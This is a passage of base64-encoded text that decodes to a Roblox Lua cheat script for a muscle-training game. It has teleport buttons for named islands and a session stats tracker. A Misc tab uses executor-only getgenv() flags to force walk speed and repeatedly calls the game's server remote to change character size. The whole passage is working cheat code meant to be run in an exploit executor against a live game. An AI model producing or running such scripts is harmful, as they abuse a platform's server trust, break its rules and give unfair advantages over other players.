xheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTY3NjgsIDcsIC0xMjg3KQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICBUZXh0ID0gIlRlbGVwb3J0ZWQgdG8gSGVsbCBJc2xhbmQiLAogICAgICAgIER1cmF0aW9uID0gMAogICAgfSkKZW5kKQoKdGVsZXBvcnQ6QWRkQnV0dG9uKCJMZWdlbmQgSXNsYW5kIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg0NjA0LCA5OTEsIC0zODg3KQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICBUZXh0ID0gIlRlbGVwb3J0ZWQgdG8gTGVnZW5kIElzbGFuZCIsCiAgICAgICAgRHVyYXRpb24gPSAwCiAgICB9KQplbmQpCgp0ZWxlcG9ydDpBZGRCdXR0b24oIk11c2NsZSBLaW5nIElzbGFuZCIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTg2NDYsIDE3LCAtNTczOCkKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgVGV4dCA9ICJUZWxlcG9ydGVkIHRvIE11c2NsZSBLaW5nIiwKICAgICAgICBEdXJhdGlvbiA9IDAKICAgIH0pCmVuZCkKCnRlbGVwb3J0OkFkZEJ1dHRvbigiSnVuZ2xlIElzbGFuZCIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTg2NTksIDYsIDIzODQpCiAgICAKICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgIFRleHQgPSAiVGVsZXBvcnRlZCB0byBKdW5nbGUgSXNsYW5kIiwKICAgICAgICBEdXJhdGlvbiA9IDAKICAgIH0pCmVuZCkKCnRlbGVwb3J0OkFkZEJ1dHRvbigiQnJhd2wgTGF2YSIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoNDQ3MSwgMTE5LCAtODgzNikKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgVGV4dCA9ICJUZWxlcG9ydGVkIHRvIEJyYXdsIExhdmEiLAogICAgICAgIER1cmF0aW9uID0gMAogICAgfSkKZW5kKQoKdGVsZXBvcnQ6QWRkQnV0dG9uKCJCcmF3bCBEZXNlcnQiLCBmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk2MCwgMTcsIC03Mzk4KQogICAgCmdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgIFRleHQgPSAiVGVsZXBvcnRlZCB0byBCcmF3bCBEZXNlcnQiLAogICAgICAgIER1cmF0aW9uID0gMAogICAgfSkKZW5kKQoKdGVsZXBvcnQ6QWRkQnV0dG9uKCJCcmF3bCBSZWd1bGFyIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMTg0OSwgMjAsIC02MzM1KQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICBUZXh0ID0gIlRlbGVwb3J0ZWQgdG8gQnJhd2wgUmVndWxhciIsCiAgICAgICAgRHVyYXRpb24gPSAwCiAgICB9KQplbmQpCgpzdGF0cyA9IHdpbmRvdzpBZGRUYWIoIlN0YXRzIikKCmxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBsZWFkZXJzdGF0cyA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoImxlYWRlcnN0YXRzIikKbG9jYWwgc3RyZW5ndGhTdGF0ID0gbGVhZGVyc3RhdHM6V2FpdEZvckNoaWxkKCJTdHJlbmd0aCIpCmxvY2FsIHJlYmlydGhzU3RhdCA9IGxlYWRlcnN0YXRzOldhaXRGb3JDaGlsZCgiUmViaXJ0aHMiKQpsb2NhbCBkdXJhYmlsaXR5U3RhdCA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIkR1cmFiaWxpdHkiKQpsb2NhbCBraWxsc1N0YXQgPSBsZWFkZXJzdGF0czpXYWl0Rm9yQ2hpbGQoIktpbGxzIikKbG9jYWwgYWdpbGl0eVN0YXQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJBZ2lsaXR5IikKbG9jYWwgZXZpbEthcm1hU3RhdCA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoImV2aWxLYXJtYSIpCmxvY2FsIGdvb2RLYXJtYVN0YXQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJnb29kS2FybWEiKQpsb2NhbCBicmF3bHNTdGF0ID0gbGVhZGVyc3RhdHM6V2FpdEZvckNoaWxkKCJCcmF3bHMiKQoKbG9jYWwgZnVuY3Rpb24gQWJicmV2TnVtYmVyKG51bSkKICAgIGxvY2FsIGFiYnJldiA9IHsiIiwgIksiLCAiTSIsICJCIiwgIlQiLCAiUWEiLCAiUWkifQogICAgbG9jYWwgaSA9IDEKICAgIHdoaWxlIG51bSA+PSAxMDAwIGFuZCBpIDwgI2FiYnJldiBkbwogICAgICAgIG51bSA9IG51bSAvIDEwMDAKICAgICAgICBpID0gaSArIDEKICAgIGVuZAogICAgcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMmYlcyIsIG51bSwgYWJicmV2W2ldKQplbmQKCnN0YXRzOkFkZExhYmVsKCJTZXNzaW9uIFN0YXRpc3RpY3MiKS5UZXh0U2l6ZSA9IDMwCmxvY2FsIHN0b3B3YXRjaExhYmVsID0gc3RhdHM6QWRkTGFiZWwoIlNlc3Npb24gVGltZTogMGQgMGggMG0gMHMiKQpzdG9wd2F0Y2hMYWJlbC5UZXh0U2l6ZSA9IDIwCgpsb2NhbCBjdXN0b21UaW1lckxhYmVsID0gc3RhdHM6QWRkTGFiZWwoIkN1c3RvbSBUaW1lcjogTm90IHN0YXJ0ZWQiKQpjdXN0b21UaW1lckxhYmVsLlRleHRTaXplID0gMjAKCmxvY2FsIGlzQ3VzdG9tUnVubmluZyA9IGZhbHNlCmxvY2FsIGN1c3RvbVN0YXJ0ID0gMApsb2NhbCBjdXN0b21FbGFwc2VkID0gMAoKc3RhdHM6QWRkQnV0dG9uKCJTdGFydC9TdG9wIEN1c3RvbSBUaW1lciIsIGZ1bmN0aW9uKCkKICAgIGlmIG5vdCBpc0N1c3RvbVJ1bm5pbmcgdGhlbgogICAgICAgIGlzQ3VzdG9tUnVubmluZyA9IHRydWUKICAgICAgICBjdXN0b21TdGFydCA9IHRpY2soKSAtIGN1c3RvbUVsYXBzZWQKICAgIGVsc2UKICAgICAgICBpc0N1c3RvbVJ1bm5pbmcgPSBmYWxzZQogICAgICAgIGN1c3RvbUVsYXBzZWQgPSB0aWNrKCkgLSBjdXN0b21TdGFydAogICAgZW5kCmVuZCkKCnN0YXRzOkFkZEJ1dHRvbigiUmVzZXQgQ3VzdG9tIFRpbWVyIiwgZnVuY3Rpb24oKQogICAgaXNDdXN0b21SdW5uaW5nID0gZmFsc2UKICAgIGN1c3RvbVN0YXJ0ID0gMAogICAgY3VzdG9tRWxhcHNlZCA9IDAKICAgIGN1c3RvbVRpbWVyTGFiZWwuVGV4dCA9ICJDdXN0b20gVGltZXI6IE5vdCBzdGFydGVkIgplbmQpCgpsb2NhbCByZXNldFNlc3Npb24gPSBmYWxzZQpzdGF0czpBZGRCdXR0b24oIlJlc2V0IFNlc3Npb24gU3RhdHMiLCBmdW5jdGlvbigpCiAgICByZXNldFNlc3Npb24gPSB0cnVlCmVuZCkKCnN0YXRzOkFkZExhYmVsKCItLS0tLS0tLS0tLS0tLS0tLS0iKS5UZXh0U2l6ZSA9IDE0CgpzdGF0czpBZGRMYWJlbCgiUHJvamVjdGVkIFN0YXRzIikuVGV4dFNpemUgPSAzMApsb2NhbCBwcm9qZWN0ZWRTdHJlbmd0aExhYmVsID0gc3RhdHM6QWRkTGFiZWwoIlN0cmVuZ3RoIFBhY2U6IC0iKQpwcm9qZWN0ZWRTdHJlbmd0aExhYmVsLlRleHRTaXplID0gMjAKbG9jYWwgcHJvamVjdGVkRHVyYWJpbGl0eUxhYmVsID0gc3RhdHM6QWRkTGFiZWwoIkR1cmFiaWxpdHkgUGFjZTogLSIpCnByb2plY3RlZER1cmFiaWxpdHlMYWJlbC5UZXh0U2l6ZSA9IDIwCmxvY2FsIHByb2plY3RlZFJlYmlydGhzTGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiUmViaXJ0aCBQYWNlOiAtIikKcHJvamVjdGVkUmViaXJ0aHNMYWJlbC5UZXh0U2l6ZSA9IDIwCgpzdGF0czpBZGRMYWJlbCgiLS0tLS0tLS0tLS0tLS0tLS0tIikuVGV4dFNpemUgPSAxNAoKc3RhdHM6QWRkTGFiZWwoIkxlYWRlcmJvYXJkIFN0YXRzIikuVGV4dFNpemUgPSAzMApsb2NhbCBzdHJlbmd0aExhYmVsID0gc3RhdHM6QWRkTGFiZWwoIlN0cmVuZ3RoOiAtIikKc3RyZW5ndGhMYWJlbC5UZXh0U2l6ZSA9IDIwCmxvY2FsIHJlYmlydGhzTGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiUmViaXJ0aHM6IC0iKQpyZWJpcnRoc0xhYmVsLlRleHRTaXplID0gMjAKbG9jYWwga2lsbHNMYWJlbCA9IHN0YXRzOkFkZExhYmVsKCJLaWxsczogLSIpCmtpbGxzTGFiZWwuVGV4dFNpemUgPSAyMApsb2NhbCBicmF3bHNMYWJlbCA9IHN0YXRzOkFkZExhYmVsKCJCcmF3bHM6IC0iKQpicmF3bHNMYWJlbC5UZXh0U2l6ZSA9IDIwCgpzdGF0czpBZGRMYWJlbCgiLS0tLS0tLS0tLS0tLS0tLS0tIikuVGV4dFNpemUgPSAxNAoKc3RhdHM6QWRkTGFiZWwoIlBsYXllciBTdGF0cyIpLlRleHRTaXplID0gMzAKbG9jYWwgZ29vZEthcm1hTGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiR29vZCBLYXJtYTogLSIpCmdvb2RLYXJtYUxhYmVsLlRleHRTaXplID0gMjAKbG9jYWwgZXZpbEthcm1hTGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiRXZpbCBLYXJtYTogLSIpCmV2aWxLYXJtYUxhYmVsLlRleHRTaXplID0gMjAKbG9jYWwgZHVyYWJpbGl0eUxhYmVsID0gc3RhdHM6QWRkTGFiZWwoIkR1cmFiaWxpdHk6IC0iKQpkdXJhYmlsaXR5TGFiZWwuVGV4dFNpemUgPSAyMApsb2NhbCBhZ2lsaXR5TGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiQWdpbGl0eTogLSIpCmFnaWxpdHlMYWJlbC5UZXh0U2l6ZSA9IDIwCgpsb2NhbCBzdGFydFRpbWUgPSB0aWNrKCkKbG9jYWwgaW5pdGlhbFN0cmVuZ3RoID0gc3RyZW5ndGhTdGF0LlZhbHVlCmxvY2FsIGluaXRpYWxEdXJhYmlsaXR5ID0gZHVyYWJpbGl0eVN0YXQuVmFsdWUKbG9jYWwgaW5pdGlhbFJlYmlydGhzID0gcmViaXJ0aHNTdGF0LlZhbHVlCmxvY2FsIGluaXRpYWxLaWxscyA9IGtpbGxzU3RhdC5WYWx1ZQpsb2NhbCBpbml0aWFsQWdpbGl0eSA9IGFnaWxpdHlTdGF0LlZhbHVlCmxvY2FsIGluaXRpYWxFdmlsS2FybWEgPSBldmlsS2FybWFTdGF0LlZhbHVlCmxvY2FsIGluaXRpYWxHb29kS2FybWEgPSBnb29kS2FybWFTdGF0LlZhbHVlCmxvY2FsIGluaXRpYWxCcmF3bHMgPSBicmF3bHNTdGF0LlZhbHVlCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIGxvY2FsIGxhc3RVcGRhdGUgPSAwCiAgICB3aGlsZSB0YXNrLndhaXQoMC4yKSBkbwogICAgICAgIGxvY2FsIGVsYXBzZWRUaW1lID0gdGljaygpIC0gc3RhcnRUaW1lCiAgICAgICAgbG9jYWwgZGF5cyA9IG1hdGguZmxvb3IoZWxhcHNlZFRpbWUgLyAoMjQgKiAzNjAwKSkKICAgICAgICBsb2NhbCBob3VycyA9IG1hdGguZmxvb3IoKGVsYXBzZWRUaW1lICUgKDI0ICogMzYwMCkpIC8gMzYwMCkKICAgICAgICBsb2NhbCBtaW51dGVzID0gbWF0aC5mbG9vcigoZWxhcHNlZFRpbWUgJSAzNjAwKSAvIDYwKQogICAgICAgIGxvY2FsIHNlY29uZHMgPSBtYXRoLmZsb29yKGVsYXBzZWRUaW1lICUgNjApCiAgICAgICAgc3RvcHdhdGNoTGFiZWwuVGV4dCA9IHN0cmluZy5mb3JtYXQoIlNlc3Npb24gVGltZTogJWRkICVkaCAlZG0gJWRzIiwgZGF5cywgaG91cnMsIG1pbnV0ZXMsIHNlY29uZHMpCgogICAgICAgIGlmIGlzQ3VzdG9tUnVubmluZyB0aGVuCiAgICAgICAgICAgIGN1c3RvbUVsYXBzZWQgPSB0aWNrKCkgLSBjdXN0b21TdGFydAogICAgICAgIGVuZAogICAgICAgIGlmIGN1c3RvbUVsYXBzZWQgPiAwIHRoZW4KICAgICAgICAgICAgbG9jYWwgZCA9IG1hdGguZmxvb3IoY3VzdG9tRWxhcHNlZCAvICgyNCAqIDM2MDApKQogICAgICAgICAgICBsb2NhbCBoID0gbWF0aC5mbG9vcigoY3VzdG9tRWxhcHNlZCAlICgyNCAqIDM2MDApKSAvIDM2MDApCiAgICAgICAgICAgIGxvY2FsIG0gPSBtYXRoLmZsb29yKChjdXN0b21FbGFwc2VkICUgMzYwMCkgLyA2MCkKICAgICAgICAgICAgbG9jYWwgcyA9IG1hdGguZmxvb3IoY3VzdG9tRWxhcHNlZCAlIDYwKQogICAgICAgICAgICBjdXN0b21UaW1lckxhYmVsLlRleHQgPSBzdHJpbmcuZm9ybWF0KCJDdXN0b20gVGltZXI6ICVkZCAlZGggJWRtICVkcyIsIGQsIGgsIG0sIHMpCiAgICAgICAgZW5kCgogICAgICAgIGlmIHJlc2V0U2Vzc2lvbiB0aGVuCiAgICAgICAgICAgIHN0YXJ0VGltZSA9IHRpY2soKQogICAgICAgICAgICBpbml0aWFsU3RyZW5ndGggPSBzdHJlbmd0aFN0YXQuVmFsdWUKICAgICAgICAgICAgaW5pdGlhbER1cmFiaWxpdHkgPSBkdXJhYmlsaXR5U3RhdC5WYWx1ZQogICAgICAgICAgICBpbml0aWFsUmViaXJ0aHMgPSByZWJpcnRoc1N0YXQuVmFsdWUKICAgICAgICAgICAgaW5pdGlhbEtpbGxzID0ga2lsbHNTdGF0LlZhbHVlCiAgICAgICAgICAgIGluaXRpYWxBZ2lsaXR5ID0gYWdpbGl0eVN0YXQuVmFsdWUKICAgICAgICAgICAgaW5pdGlhbEV2aWxLYXJtYSA9IGV2aWxLYXJtYVN0YXQuVmFsdWUKICAgICAgICAgICAgaW5pdGlhbEdvb2RLYXJtYSA9IGdvb2RLYXJtYVN0YXQuVmFsdWUKICAgICAgICAgICAgaW5pdGlhbEJyYXdscyA9IGJyYXdsc1N0YXQuVmFsdWUKICAgICAgICAgICAgcmVzZXRTZXNzaW9uID0gZmFsc2UKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgY1N0ciA9IHN0cmVuZ3RoU3RhdC5WYWx1ZQogICAgICAgIGxvY2FsIGNSZWIgPSByZWJpcnRoc1N0YXQuVmFsdWUKICAgICAgICBsb2NhbCBjRHVyID0gZHVyYWJpbGl0eVN0YXQuVmFsdWUKICAgICAgICBsb2NhbCBjS2lsbHMgPSBraWxsc1N0YXQuVmFsdWUKICAgICAgICBsb2NhbCBjQWdpID0gYWdpbGl0eVN0YXQuVmFsdWUKICAgICAgICBsb2NhbCBjRXZpbCA9IGV2aWxLYXJtYVN0YXQuVmFsdWUKICAgICAgICBsb2NhbCBjR29vZCA9IGdvb2RLYXJtYVN0YXQuVmFsdWUKICAgICAgICBsb2NhbCBjQnJhd2wgPSBicmF3bHNTdGF0LlZhbHVlCgogICAgICAgIGxvY2FsIGRTdHIgPSBjU3RyIC0gaW5pdGlhbFN0cmVuZ3RoCiAgICAgICAgbG9jYWwgZER1ciA9IGNEdXIgLSBpbml0aWFsRHVyYWJpbGl0eQogICAgICAgIGxvY2FsIGRSZWIgPSBjUmViIC0gaW5pdGlhbFJlYmlydGhzCiAgICAgICAgbG9jYWwgZEtpbGxzID0gY0tpbGxzIC0gaW5pdGlhbEtpbGxzCiAgICAgICAgbG9jYWwgZEFnaSA9IGNBZ2kgLSBpbml0aWFsQWdpbGl0eQogICAgICAgIGxvY2FsIGRFdmlsID0gY0V2aWwgLSBpbml0aWFsRXZpbEthcm1hCiAgICAgICAgbG9jYWwgZEdvb2QgPSBjR29vZCAtIGluaXRpYWxHb29kS2FybWEKICAgICAgICBsb2NhbCBkQnJhd2wgPSBjQnJhd2wgLSBpbml0aWFsQnJhd2xzCgogICAgICAgIHN0cmVuZ3RoTGFiZWwuVGV4dCA9ICJTdHJlbmd0aDogIiAuLiBBYmJyZXZOdW1iZXIoY1N0cikgLi4gIiB8ICsiIC4uIEFiYnJldk51bWJlcihkU3RyKQogICAgICAgIHJlYmlydGhzTGFiZWwuVGV4dCA9ICJSZWJpcnRoczogIiAuLiBBYmJyZXZOdW1iZXIoY1JlYikgLi4gIiB8ICsiIC4uIEFiYnJldk51bWJlcihkUmViKQogICAgICAgIGtpbGxzTGFiZWwuVGV4dCA9ICJLaWxsczogIiAuLiBBYmJyZXZOdW1iZXIoY0tpbGxzKSAuLiAiIHwgKyIgLi4gQWJicmV2TnVtYmVyKGRLaWxscykKICAgICAgICBicmF3bHNMYWJlbC5UZXh0ID0gIkJyYXdsczogIiAuLiBBYmJyZXZOdW1iZXIoY0JyYXdsKSAuLiAiIHwgKyIgLi4gQWJicmV2TnVtYmVyKGRCcmF3bCkKCiAgICAgICAgZ29vZEthcm1hTGFiZWwuVGV4dCA9ICJHb29kIEthcm1hOiAiIC4uIEFiYnJldk51bWJlcihjR29vZCkgLi4gIiB8ICsiIC4uIEFiYnJldk51bWJlcihkR29vZCkKICAgICAgICBldmlsS2FybWFMYWJlbC5UZXh0ID0gIkV2aWwgS2FybWE6ICIgLi4gQWJicmV2TnVtYmVyKGNFdmlsKSAuLiAiIHwgKyIgLi4gQWJicmV2TnVtYmVyKGRFdmlsKQogICAgICAgIGR1cmFiaWxpdHlMYWJlbC5UZXh0ID0gIkR1cmFiaWxpdHk6ICIgLi4gQWJicmV2TnVtYmVyKGNEdXIpIC4uICIgfCArIiAuLiBBYmJyZXZOdW1iZXIoZER1cikKICAgICAgICBhZ2lsaXR5TGFiZWwuVGV4dCA9ICJBZ2lsaXR5OiAiIC4uIEFiYnJldk51bWJlcihjQWdpKSAuLiAiIHwgKyIgLi4gQWJicmV2TnVtYmVyKGRBZ2kpCgogICAgICAgIGlmIHRpY2soKSAtIGxhc3RVcGRhdGUgPj0gNiB0aGVuCiAgICAgICAgICAgIGxhc3RVcGRhdGUgPSB0aWNrKCkKICAgICAgICAgICAgbG9jYWwgc1NlYyA9IGRTdHIgLyBlbGFwc2VkVGltZQogICAgICAgICAgICBsb2NhbCBkU2VjID0gZER1ciAvIGVsYXBzZWRUaW1lCiAgICAgICAgICAgIGxvY2FsIHJTZWMgPSBkUmViIC8gZWxhcHNlZFRpbWUKCiAgICAgICAgICAgIGxvY2FsIGggPSAzNjAwCiAgICAgICAgICAgIGxvY2FsIGQgPSA4NjQwMAoKICAgICAgICAgICAgcHJvamVjdGVkU3RyZW5ndGhMYWJlbC5UZXh0ID0gIlN0cmVuZ3RoIFBhY2U6ICIgLi4gQWJicmV2TnVtYmVyKG1hdGguZmxvb3Ioc1NlYyAqIGgpKSAuLiAiL2ggfCAiIC4uIEFiYnJldk51bWJlcihtYXRoLmZsb29yKHNTZWMgKiBkKSkgLi4gIi9kIgogICAgICAgICAgICBwcm9qZWN0ZWREdXJhYmlsaXR5TGFiZWwuVGV4dCA9ICJEdXJhYmlsaXR5IFBhY2U6ICIgLi4gQWJicmV2TnVtYmVyKG1hdGguZmxvb3IoZFNlYyAqIGgpKSAuLiAiL2ggfCAiIC4uIEFiYnJldk51bWJlcihtYXRoLmZsb29yKGRTZWMgKiBkKSkgLi4gIi9kIgogICAgICAgICAgICBwcm9qZWN0ZWRSZWJpcnRoc0xhYmVsLlRleHQgPSAiUmViaXJ0aCBQYWNlOiAiIC4uIEFiYnJldk51bWJlcihtYXRoLmZsb29yKHJTZWMgKiBoKSkgLi4gIi9oIHwgIiAuLiBBYmJyZXZOdW1iZXIobWF0aC5mbG9vcihyU2VjICogZCkpIC4uICIvZCIKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpNaXNjID0gd2luZG93OkFkZFRhYigiTWlzYyIpCgpNaXNjOkFkZExhYmVsKCItLS0tTWlzYyAxLS0tLSIpLlRleHRTaXplID0gMjIKCmxvY2FsIHNlbGVjdGVkU3BlZWQgPSAxMjUKCk1pc2M6QWRkVGV4dEJveCgiU3BlZWQiLCBmdW5jdGlvbih2YWwpCiAgICBzZWxlY3RlZFNwZWVkID0gdG9udW1iZXIodmFsKSBvciAxMjUKICAgIGlmIGdldGdlbnYoKS5BdXRvU3BlZWQgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuV2Fsa1NwZWVkID0gc2VsZWN0ZWRTcGVlZAogICAgZW5kCmVuZCwgewogICAgWyJjbGVhciJdID0gZmFsc2UsCiAgICBbImRlZmF1bHQiXSA9ICIxMjUiLAogICAgWyJwbGFjZWhvbGRlciJdID0gIkVudGVyIFNwZWVkLi4uIgp9KQoKTWlzYzpBZGRTd2l0Y2goIlNldCBTcGVlZCIsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLkF1dG9TcGVlZCA9IHN0YXRlCiAgICB3aGlsZSBnZXRnZW52KCkuQXV0b1NwZWVkIGRvCiAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuV2Fsa1NwZWVkID0gc2VsZWN0ZWRTcGVlZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgpCiAgICBlbmQKZW5kKQoKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcikKICAgIGlmIGdldGdlbnYoKS5BdXRvU3BlZWQgdGhlbgogICAgICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKICAgICAgICBodW1hbm9pZC5XYWxrU3BlZWQgPSBzZWxlY3RlZFNwZWVkCiAgICBlbmQKZW5kKQoKbG9jYWwgc2VsZWN0ZWRTaXplID0gMgoKTWlzYzpBZGRUZXh0Qm94KCJTaXplIiwgZnVuY3Rpb24odmFsKQogICAgc2VsZWN0ZWRTaXplID0gdG9udW1iZXIodmFsKSBvciAyCiAgICBpZiBnZXRnZW52KCkuQXV0b1NpemUgdGhlbgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmNoYW5nZVNwZWVkU2l6ZVJlbW90ZTpJbnZva2VTZXJ2ZXIoImNoYW5nZVNpemUiLCBzZWxlY3RlZFNpemUpCiAgICBlbmQKZW5kLCB7CiAgICBbImNsZWFyIl0gPSBmYWxzZSwKICAgIFsiZGVmYXVsdCJdID0gIjIiLAogICAgWyJwbGFjZWhvbGRlciJdID0gIkVudGVyIFNpemUuLi4iCn0pCgpNaXNjOkFkZFN3aXRjaCgiU2V0IFNpemUiLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS5BdXRvU2l6ZSA9IHN0YXRlCiAgICB3aGlsZSBnZXRnZW52KCkuQXV0b1NpemUgZG8KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5jaGFuZ2VTcGVlZFNpemVSZW1vdGU6SW52b2tlU2VydmVyKCJjaGFuZ2VTaXplIiwgc2VsZWN0ZWRTaXplKQogICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICBlbmQKZW5kKQoKTWlzYzpBZGRMYWJlbCgiLS0tLU1